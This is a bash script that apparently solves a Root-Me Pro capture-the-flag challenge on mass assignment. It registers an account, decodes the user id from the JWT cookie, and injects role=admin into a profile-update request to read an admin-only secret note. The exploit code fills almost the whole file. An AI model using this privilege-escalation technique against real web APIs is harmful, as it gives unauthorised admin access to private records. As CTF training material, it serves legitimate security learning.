#!/bin/bash
# API - Mass Assignment (Root-Me Pro) — full solve
#
# The bug: POST /api/update-profile assigns every submitted form field onto the
# user object, so an extra `role=admin` promotes the account. Body MUST be
# form-encoded — the handler reads request.form and silently ignores a JSON body
# (it returns 302 either way; the tell is that your fields come back blanked).
#
# NOTE: the instance this was solved against expired before this script could be
# run end-to-end. The manual curl sequence it encodes is exactly what produced
# the flag (see notes.md). Pass a fresh instance URL as $1 to re-run.
set -euo pipefail

B="${1:-https://instance-019fe9ed-c810-712c-8f1d-70e178c787a0.challenges.root-me.pro}"
U="pauk$RANDOM"
P="Passw0rd123"
CJ="$(mktemp)"
HDRS="$(mktemp)"
trap 'rm -f "$CJ" "$HDRS"' EXIT

echo "[*] Registering $U"
curl -sf -X POST "$B/api/register" \
     -d "username=$U&password=$P&full_name=Pauk+Test&date_of_birth=1999-01-01&blood_type=O%2B" \
     -o /dev/null

echo "[*] Logging in"
curl -s -c "$CJ" -D "$HDRS" -X POST "$B/api/login" -d "username=$U&password=$P" -o /dev/null

# Recover our own patient id from the JWT payload in the Set-Cookie header.
# base64url needs its padding restored before decoding.
JWT=$(sed -n 's/.*[Ss]et-[Cc]ookie: *token=\([^;]*\).*/\1/p' "$HDRS" | tr -d '\r')
if [ -z "$JWT" ]; then
    echo "[!] No token cookie issued — login failed. Is the instance still alive?" >&2
    exit 1
fi
ID=$(printf '%s' "$JWT" | cut -d. -f2 | python3 -c \
    'import sys,base64,json;s=sys.stdin.read().strip();print(json.loads(base64.urlsafe_b64decode(s+"="*(-len(s)%4)))["id"])')
echo "[*] Our patient id: $ID"

echo "[*] Mass assignment: injecting role=admin alongside the legit fields"
curl -s -b "$CJ" -c "$CJ" -X POST "$B/api/update-profile" \
     -d 'allergies=Penicillin&medications=None&role=admin' -o /dev/null

echo "[*] Reading our own record — secret_note is only emitted for role=admin"
curl -s -b "$CJ" "$B/api/patients/$ID" | python3 -m json.tool
